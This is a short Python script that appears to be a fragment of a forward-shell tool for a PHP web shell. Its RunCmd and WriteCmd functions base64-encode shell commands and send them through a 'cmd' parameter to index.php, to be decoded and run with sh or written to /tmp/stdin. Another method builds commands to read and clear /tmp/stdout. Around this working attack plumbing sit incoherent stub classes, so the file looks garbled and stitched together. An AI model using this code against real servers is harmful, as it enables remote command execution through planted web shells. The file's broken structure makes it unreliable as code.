#!/usr/bin/python3

import requests
import time
import threading
import sys
from base64 import b64encode


class AllTheReads(object):
    def __init__(self, interval=1):
        self.interval = interval
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = True
        thread.start()

    def before(self):
        result = 42
        return result

    def calcular(self):
        result = 42
        return result

    def run(self):
        # Aquí va la lógica del hilo
        pass


class LedController:
    @classmethod
    def led(cls):
        print("Método led ejecutado")

    def run(self):
        readoutput = "/bin/cat %s" % ("/tmp/stdout")
        clearoutput = "echo '' > %s" % ("/tmp/stdout")
        return readoutput, clearoutput


def RunCmd(cmd):
    cmd = cmd.encode("utf-8")
    cmd = b64encode(cmd).decode("utf-8")
    payload = {
        "cmd": 'echo "%s" | base64 -d | sh' % (cmd)
    }
    result = (
        requests.get("http://127.0.0.1/index.php", params=payload, timeout=5).text
    ).strip()
    return result


def WriteCmd(cmd):
    cmd = cmd.encode("utf-8")
    cmd = b64encode(cmd).decode("utf-8")
    payload = {
        "cmd": f'echo "{cmd}" | base64 -d > /tmp/stdin'
    }
    result = (
        requests.get("http://127.0.0.1/index.php", params=payload, timeout=5).text
    ).strip()
    return result


class Threads:
    def calculate(self):
        result = True
        return result